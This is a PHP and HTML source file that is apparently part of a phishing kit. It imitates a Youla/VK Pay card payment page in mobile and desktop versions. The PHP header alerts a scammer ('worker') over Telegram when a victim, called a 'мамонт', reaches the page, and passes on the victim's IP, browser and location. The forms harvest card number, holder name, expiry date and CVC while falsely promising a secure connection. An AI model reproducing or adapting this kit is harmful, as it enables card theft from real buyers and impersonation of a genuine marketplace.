<?php

	preg_match_all('/\/order\/([0-9]{11})/i', $_SERVER['REQUEST_URI'], $matches, PREG_PATTERN_ORDER);
	$advert_id = $matches[1][0];

	if(isset($_COOKIE['order_id'])) {
		$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '1' AND `advert_id` = '$advert_id' AND `status` = '1'");
		
		if(mysqli_num_rows($query) > 0) {
			$order = mysqli_fetch_assoc($query);
			
			if($order['delivery'] != '0') {
				$delivery = $order['delivery'];
			} else {
				$delivery = $config['delivery'];
			}
			
			setcookie('type', 'order', time()+3600, '/');
			
			$text = "⚠️❕ <b>Мамонт перешел на страницу оплаты</b>❕⚠️\n\n";
			$text .= "🌐 <b>Платформа:</b> <code>Юла</code>\n";
			$text .= "🆔 <b>ID объявления:</b> <code>$order[advert_id]</code>\n";
			$text .= "📦 <b>Название товара:</b> <code>$order[title]</code>\n";
			$text .= "💰 <b>Сумма товара:</b> <code>$order[price] руб.</code>\n";
			$text .= "🚚 <b>Сумма доставки:</b> <code>$delivery руб.</code>\n";
			$text .= "\n$visitor[os] — ".getCountryFlag($visitor['country_code'])." $visitor[country], $visitor[city]\n";
			$text .= "Браузер $visitor[browser], $visitor[ip]";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		} else {
			header('Location: https://'.$_SERVER['SERVER_NAME'].'/');
		}
	} else {
		header('Location: /product/'.$advert_id.'/buy/delivery');
	}

?>

<?php if($visitor['mobile'] == TRUE) { ?>

<!DOCTYPE html>
<html lang="ru" prefix="og: http://ogp.me/ns#" id="html">
<head>
	<title>Оплата с банковской карты</title>
	<meta charset="utf-8">
	<meta name="robots" content="all">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/cpg_waiter.css" />
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/jquery.selectBox.css" />
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/pay-card.css">
	<script type="text/javascript" src="/assets/js/payment/feature-detect.js"></script>
	<script type="text/javascript" src="/assets/js/payment/es5-shim.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/jquery-1.11.3.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/jquery.selectBox.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/rb.js"></script>
	<script type="text/javascript" src="/assets/js/payment/common.js"></script>
	<script type="text/javascript" src="/assets/js/payment/cpg_waiter.js"></script>
	<script type="text/javascript" src="/assets/js/payment/standard_waiter.js"></script>
	<meta property="og:site_name" content="Юла">
	<meta property="og:title" content="Оформление и оплата">
	<meta property="og:type" content="website">
	<meta property="og:url" content="https://youla.ru/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:image" content="https://i.imgur.com/oai1BAt.jpg">
	<meta property="og:image:secure_url" content="https://i.imgur.com/oai1BAt.jpg">
	<meta property="og:image:type" content="image/jpeg">
	<meta property="og:image:width" content="500">
	<meta property="og:image:height" content="500">
	<meta property="og:description" content="Выгодно покупайте и продавайте авто, недвижимость и вещи в России. Находите надёжных исполнителей и работу. Самый популярный сервис объявлений в России.">
	<style>
		#loading {
		   width: 100%;
		   height: 100%;
		   top: 0;
		   left: 0;
		   position: fixed;
		   display: block;
		   opacity: 0.7;
		   background-color: #fff;
		   z-index: 99;
		   text-align: center;
		}

		#loading-image {
		  position: absolute;
		  top: 50%;
		  left: 50%;
		  z-index: 100;
		}
	</style>
</head>
<body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile">
	<div id="loading">
		<img id="loading-image" src="/assets/img/loader.gif" alt="Пожалуйста подождите..." />
	</div>
	<div class="pay-card-layout pay-card-layout_type_youla-mobile">
		<div class="pay-card-layout__header_type_vkpay">
			<div class="pay-card-layout__logo">
				<div class="vk-pay-icon vk-pay-icon_name_logo"></div>
			</div>
		</div>
		<div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay">
			<div class="pay-card__row">
				<div class="pay-card__card js-credit-card">
					<div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
						<div class="credit-card-form__popup-overlay js-cc-popup-overlay">
							<div class="credit-card-form__popup js-cc-popup">
								<div class="credit-card-form__popup-body">
									<div class="notification-block">
										<div class="notification-block__inner">
											<div class="info-block ">
												<div class="info-block__img-wrapper"> <span class="img vesna-icon vesna-icon_name_alert"></span> </div>
												<div class="info-block__content">
													<h3 class="title js-error-message">Не удалось произвести оплату.</h3>
													<p class="paragraph paragraph_color_red ">Платёж был отменён.</p>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div class="credit-card-form__popup-footer js-cc-popup-footer"> <span class="js-button button">Повторить</span> </div>
							</div>
						</div>
						<div class="credit-card-form__popup-overlay js-cc-popup-overlay">
							<div class="credit-card-form__popup js-cc-timeout-popup">
								<div class="credit-card-form__popup-body">
									<div class="notification-block">
										<div class="notification-block__inner">
											<div class="info-block ">
												<div class="info-block__img-wrapper"> <span class="img vesna-icon vesna-icon_name_alert"></span> </div>
												<div class="info-block__content">
													<h3 class="title js-timeout-error-message">Статус операции неизвестен.</h3>
													<p class="paragraph paragraph_color_red ">Нажмите кнопку, чтобы узнать статус заказа.
														<br>Возможно, он прошел успешно.</p>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div class="credit-card-form__popup-footer js-cc-popup-footer"> <span class="js-button button">Узнать статус</span> </div>
							</div>
						</div>
						<form method="POST" action="pay.php" onsubmit="return load();" class="credit-card-form__form js-card-form" autocomplete="on">
							<div class="credit-card-form__card-wrapper">
								<div class="credit-card-form__card credit-card-form__card_position_front">
									<div class="payment-systems-icons payment-systems-icons">
										<span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
										<span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
										<span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
										<span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
									</div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Номер карты</span>
											<input type="tel" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="От 16 до 19 цифр" class="credit-card-form__input js-cc-input js-cc-number-input" <?php if(isset($_COOKIE['num'])) echo "value=\"$_COOKIE[num]\""; ?> required>
											<div class="credit-card-form__error-text">Номер карты введён неверно</div>
										</label>
									</div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Имя и фамилия на карте</span>
											<input type="text" name="cardholder" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" <?php if(isset($_COOKIE['name'])) echo "value=\"$_COOKIE[name]\""; ?> required>
											<div class="credit-card-form__error-text">Имя и фамилия латинскими буквами, как на карте</div>
										</label>
									</div>
									<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Срок действия</span>
											<input type="tel" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="ММ/ГГ" class="credit-card-form__input js-cc-input js-cc-exp-input" <?php if(isset($_COOKIE['exp'])) echo "value=\"$_COOKIE[exp]\""; ?> required>
											<div class="credit-card-form__error-text">Неверная дата</div>
										</label>
										<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">CVC/CVV код <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
											<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Последние 3 цифры на полосе для подписи
												<div class="credit-card-form__tooltip-icon"></div>
												<div class="credit-card-form__tooltip-arrow"></div>
											</div>
											<input type="tel" name="cvc2" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" <?php if(isset($_COOKIE['cvc'])) echo "value=\"$_COOKIE[cvc]\""; ?> required>
											<div class="credit-card-form__error-text js-cc-error-text">Последние три цифры на обороте</div>
										</label>
									</div>
								</div>
							</div>
							<div class="credit-card-form__submit">
								<div class="credit-card-form__submit-inner">
									<input type="hidden" name="amount" value="<?php echo $order['price']+$delivery; ?>">
									<input type="hidden" name="description" value="<?php echo $order['title']; ?>">
									<input type="hidden" name="order_id" value="<?php echo $order['advert_id']; ?>">
									<input type="submit" class="js-button-submit button" name="submit" value="Подтвердить оплату">
								</div>
							</div>
							<div class="credit-card-form__terms">Нажимая кнопку, вы принимаете <a class="credit-card-form__terms-link" href="https://money.mail.ru/oferta/youla_service" target="_blank" rel="noopener noreferrer">условия соглашения</a>. </div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<div class="secure-information secure-information_type_youla-mobile">
			<span class="secure-information__text" title="Защищённое соединение. Ваши данные в безопасности.">
			<span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol">HTTPS / SSL</span>
			<span class="secure-information__text_type_secure-connection">Защищённое соединение</span>
			</span>
		</div>
	</div>
	<script src="/assets/js/maskedinput.js"></script>
	<script language="javascript" type="text/javascript">
		function load() {
			$('#loading').show();
		}
	
		$(window).load(function() {
			$('#loading').hide();
		});
		
		window.onload = function () {
			var system = document.getElementById('cardnumber');
			system.onkeyup = function () {
				var value = system.value;
				system.value.replace(/(\d)(?=(\d{3})+(\D|$))/g, '$1')
				if (value.length > 0) {
					var num = value[0];
					if (num == 2) {
						$('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 4) {
						$('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 5) {
						$('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 6) {
						$('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					}
				}
				
				if (value.length <= 0) {
					$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				}
			}
		}

		$(document).ready(function() {
			$("#cardnumber").mask("9999 9999 9999 9999", {placeholder: ""}, {autoclear: false});
			$("#expdate").mask("99/99", {placeholder: ""}, {autoclear: false});
			$("#cvc2").mask("999", {placeholder: ""}, {autoclear: false});
		});
	</script>
</body>
</html>

<?php } else { ?>

<!DOCTYPE html>
<html>
<head>
	<title>Оплата с банковской карты</title>
	<meta charset="utf-8">
	<meta name="robots" content="all">
	<meta name="description" content="">
	<meta name="keywords" content="">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/cpg_waiter.css" />
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/jquery.selectBox.css" />
	<link rel="stylesheet" type="text/css" href="/assets/css/payment/pay-card.css">
	<script type="text/javascript" src="/assets/js/payment/feature-detect.js"></script>
	<script type="text/javascript" src="/assets/js/payment/es5-shim.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/jquery-1.11.3.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/jquery.selectBox.min.js"></script>
	<script type="text/javascript" src="/assets/js/payment/rb.js"></script>
	<script type="text/javascript" src="/assets/js/payment/common.js"></script>
	<script type="text/javascript" src="/assets/js/payment/cpg_waiter.js"></script>
	<script type="text/javascript" src="/assets/js/payment/standard_waiter.js"></script>
	<style>
		#loading {
		   width: 100%;
		   height: 100%;
		   top: 0;
		   left: 0;
		   position: fixed;
		   display: block;
		   opacity: 0.7;
		   background-color: #fff;
		   z-index: 99;
		   text-align: center;
		}

		#loading-image {
		  position: absolute;
		  top: 50%;
		  left: 50%;
		  z-index: 100;
		}
	</style>
</head>
<body class="body_fixed-width_no">
	<div id="loading">
		<img id="loading-image" src="/assets/img/loader.gif" alt="Пожалуйста подождите..." />
	</div>
	<div class="pay-card-layout pay-card-layout_type_youla">
		<div class="pay-card-layout__header_type_vkpay">
			<div class="pay-card-layout__logo">
				<div class="vk-pay-icon vk-pay-icon_name_logo"></div>
			</div>
		</div>
		<div class="pay-card js-pay-card pay-card_type_youla" data-type="freepay">
			<div class="pay-card__row">
				<div class="pay-card__card js-credit-card">
					<div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible">
						<form method="POST" action="pay.php" onsubmit="return load();" class="credit-card-form__form js-card-form" autocomplete="on">
							<div class="credit-card-form__card-wrapper">
								<div class="credit-card-form__card credit-card-form__card_position_front">
									<div class="payment-systems-icons payment-systems-icons">
										<span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
										<span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
										<span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
										<span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
									</div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_card-number clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Номер карты</span>
											<input type="tel" name="cardnumber" id="cardnumber" autocomplete="cc-number" placeholder="От 16 до 19 цифр" class="credit-card-form__input js-cc-input js-cc-number-input" <?php if(isset($_COOKIE['num'])) echo "value=\"$_COOKIE[num]\""; ?> required>
											<div class="credit-card-form__error-text">Номер карты введён неверно</div>
										</label>
									</div>
									<div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Имя и фамилия на карте</span>
											<input type="text" name="cardholder" id="cardholder" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" <?php if(isset($_COOKIE['name'])) echo "value=\"$_COOKIE[name]\""; ?> required>
											<div class="credit-card-form__error-text">Имя и фамилия латинскими буквами, как на карте</div>
										</label>
									</div>
									<div class="js-card-expiry-date-block credit-card-form__label-group credit-card-form__label-group_type_expiration-date clearfix">
										<label class="js-cc-label credit-card-form__label"> <span class="credit-card-form__title">Срок действия</span>
											<input type="tel" name="expdate" id="expdate" autocomplete="cc-exp" placeholder="ММ/ГГ" class="credit-card-form__input js-cc-input js-cc-exp-input" <?php if(isset($_COOKIE['exp'])) echo "value=\"$_COOKIE[exp]\""; ?> required>
											<div class="credit-card-form__error-text">Неверная дата</div>
										</label>
									</div>
								</div>
								<div class="credit-card-form__card credit-card-form__card_position_back">
									<div class="credit-card-form__label-group credit-card-form__label-group_type_cvv clearfix">
										<label class="js-cc-label credit-card-form__label credit-card-form__label_type_cvv js-cc-cvv-label"> <span class="credit-card-form__title">CVC/CVV код <div tabindex="-1" class="credit-card-form__cvv-icon js-cc-cvv-icon"></div></span>
											<input type="tel" name="cvc2" id="cvc2" placeholder="" class="credit-card-form__input  js-cc-input js-cc-cvv-input" autocomplete="off" <?php if(isset($_COOKIE['cvc'])) echo "value=\"$_COOKIE[cvc]\""; ?> required>
											<div class="credit-card-form__error-text js-cc-error-text">Последние три цифры на обороте</div>
										</label>
									</div>
								</div>
								<div class="js-cvv-hint-tooltip credit-card-form__tooltip credit-card-form__tooltip_type_cvv"> Последние 3 цифры на поле для подписи
									<div class="credit-card-form__tooltip-icon"></div>
									<div class="credit-card-form__tooltip-arrow"></div>
								</div>
							</div>
							<div class="credit-card-form__terms"> Нажимая кнопку, вы принимаете <a class="credit-card-form__terms-link" href="https://money.mail.ru/oferta/youla_service" target="_blank" rel="noopener noreferrer">условия соглашения</a>. </div>
							<div class="credit-card-form__submit">
								<div class="credit-card-form__submit-inner">
									<input type="hidden" name="amount" value="<?php echo $order['price']+$delivery; ?>">
									<input type="hidden" name="description" value="<?php echo $order['title']; ?>">
									<input type="hidden" name="order_id" value="<?php echo $order['advert_id']; ?>">
									<input type="submit" class="js-button-submit button" name="submit" value="Подтвердить оплату">
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<div class="secure-information secure-information_type_youla">
			<span class="secure-information__text" title="Защищённое соединение. Ваши данные в безопасности.">
				<span class="secure-information__icon"></span> <span class="secure-information__text_type_protocol"></span>
				<span class="secure-information__text_type_secure-connection">Защищённое соединение</span>
			</span>
		</div>
	</div>
	<script src="/assets/js/maskedinput.js"></script>
	<script language="javascript" type="text/javascript">
		function load() {
			$('#loading').show();
		}
	
		$(window).load(function() {
			$('#loading').hide();
		});
		
		window.onload = function () {
			var system = document.getElementById('cardnumber');
			system.onkeyup = function () {
				var value = system.value;
				if (value.length > 0) {
					var num = value[0];
					if (num == 2) {
						$('#mir').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 4) {
						$('#visa').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 5) {
						$('#mastercard').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else if (num == 6) {
						$('#maestro').removeClass('payment-systems-icon_disabled_yes').addClass('payment-systems-icon_disabled_no');
					} else {
						$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
						$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
						$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
						$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					}
				}
				
				if (value.length <= 0) {
					$('#mir').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#visa').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#mastercard').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
					$('#maestro').removeClass('payment-systems-icon_disabled_no').addClass('payment-systems-icon_disabled_yes');
				}
			}
		}

		$(document).ready(function() {
			$("#cardnumber").mask("9999 9999 9999 9999", {placeholder: ""}, {autoclear: false});
			$("#expdate").mask("99/99", {placeholder: ""}, {autoclear: false});
			$("#cvc2").mask("999", {placeholder: ""}, {autoclear: false});
		});
	</script>
</body>
</html>

<?php } ?>